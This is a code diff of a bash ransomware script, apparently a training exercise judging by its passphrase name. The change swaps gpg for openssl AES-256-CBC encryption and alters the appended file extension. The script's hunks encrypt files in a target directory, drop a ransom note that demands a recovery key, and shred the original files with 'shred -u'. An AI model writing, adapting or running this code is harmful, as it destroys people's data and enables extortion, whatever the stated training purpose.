@@ -7,7 +7,7 @@ if [[ $# -ne 1 ]]; then
 fi
 
 TARGET_DIR="$1"
-EXTENSION=".wxyz"
+EXTENSION=".abcd"
 PASSPHRASE="case8-training-passphrase"
 RANSOM_NOTE="README_RECOVER_FILES.txt"
 
@@ -25,8 +25,8 @@ case "${TARGET_DIR}" in
     ;;
 esac
 
-if ! command -v gpg >/dev/null 2>&1; then
-  echo "ERROR: gpg is not installed" >&2
+if ! command -v openssl >/dev/null 2>&1; then
+  echo "ERROR: openssl is not installed" >&2
   exit 1
 fi
 
@@ -37,7 +37,7 @@ All important documents, archives, databases and project files on this system ha
 
 Do not rename encrypted files.
 Do not try to recover files with third-party tools.
-Do not modify or delete files with the .wxyz extension.
+Do not modify or delete files with the .abcd extension.
 
 To restore access to your data, you need a private recovery key.
 EOF
@@ -55,14 +55,13 @@ while IFS= read -r -d '' file; do
     continue
   fi
 
-  echo "${PASSPHRASE}" | gpg \
-    --batch \
-    --yes \
-    --pinentry-mode loopback \
-    --passphrase-fd 0 \
-    --cipher-algo AES-256 \
-    -o "${encrypted_file}" \
-    -c "${file}"
+  openssl enc \
+    -aes-256-cbc \
+    -salt \
+    -pbkdf2 \
+    -pass "pass:${PASSPHRASE}" \
+    -in "${file}" \
+    -out "${encrypted_file}"
 
   if [[ -s "${encrypted_file}" ]]; then
     shred -u -n 1 -- "${file}"
